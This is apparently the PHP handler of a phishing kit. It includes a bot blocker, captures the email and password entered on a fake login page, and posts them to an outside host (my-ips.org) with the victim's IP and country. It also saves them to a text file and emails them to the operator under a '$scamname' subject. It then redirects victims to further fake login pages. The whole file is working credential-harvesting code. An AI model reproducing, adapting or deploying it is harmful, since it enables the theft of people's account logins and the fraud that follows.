<?php
include('blocker.php');
	session_start();
	  $csrftoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
$user = strip_tags($_POST['email']);
$pass = strip_tags($_POST['password']);
$type = strip_tags($_POST['type']);
if (isset($_POST['email']) && isset($_POST['password']) ) {
require '../extra/mine.php';
if ($validaccount =="yes") {
	
	
function visitor_country()
	{
	$ip = $_SERVER['REMOTE_ADDR'];
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$country = json_decode(curl_exec($ch))->country;
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}

$user = $_POST['email'];
$pass = $_POST['password'];
$api = 'http://my-ips.org/ip/index.php'; //put api url
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");

	$data = array(
		"user" => $user,
		"pass" => $pass,
		"type" => "1",
		"country" => $country,
		"ip" => $ip
	);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $api);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	if ($result == 1) {

	$msg="-----------------+ True Login: {$validaccount} +-----------------\r\n";
	$msg.="Email	: {$user}\r\n";
	$msg.="Password	: {$pass}\r\n";
	$msg.="LOCATION ({$_SESSION['ip']},{$_SESSION['ip_countryName']},{$_SESSION['currency']})\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
$subject="-".$scamname."|T| {$_SESSION['ip_countryName']} | ".$user." | ";
$headers="From: DTECH <contact>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
	}
	   echo "<script> window.location.href = '".$gopage."' </script>";

  exit();
 } else {

    if ($type=="nextlogin") {
		$msg="-----------------+ True Login: No +-----------------\r\n";
	$msg.="Email	: {$user}\r\n";
	$msg.="Password	: {$pass}\r\n";
	$msg.="LOCATION ({$_SESSION['ip']},{$_SESSION['ip_countryName']},{$_SESSION['currency']})\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
$subject="-".$scamname."|F| {$_SESSION['ip_countryName']} | ".$user." | ";
$headers="From: DTECH <contact>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
	}
        header("Location: nextlogin?csrftoken=".$csrftoken."&email=".$_POST['email']."&invalid");
  exit();
 }else{
	 $msg="-----------------+ True Login: No +-----------------\r\n";
	$msg.="Email	: {$user}\r\n";
	$msg.="Password	: {$pass}\r\n";
	$msg.="LOCATION ({$_SESSION['ip']},{$_SESSION['ip_countryName']},{$_SESSION['currency']})\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
$subject="-".$scamname."|F| {$_SESSION['ip_countryName']} | ".$user." | ";
$headers="From: DTECH <contact>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
	}
  header("Location: bussnisslogin?csrftoken=".$csrftoken."&email=".$_POST['email']."&invalid");
  exit();
 }

 }

}if ($validaccount !=="yes") {

	$msg="-----------------+ True Login: {$validaccount} +-----------------\r\n";
	$msg.="Email	: {$user}\r\n";
	$msg.="Password	: {$pass}\r\n";
	$msg.="LOCATION ({$_SESSION['ip']},{$_SESSION['ip_countryName']},{$_SESSION['currency']})\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
$subject="-".$scamname."|F| {$_SESSION['ip_countryName']} | ".$user." | ";
$headers="From: DTECH <contact>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
	}
	   echo "<script> window.location.href = '".$gopage."' </script>";
  exit();
}
}else{
                exit(header('HTTP/1.0 404 Not Found'));
}
?>
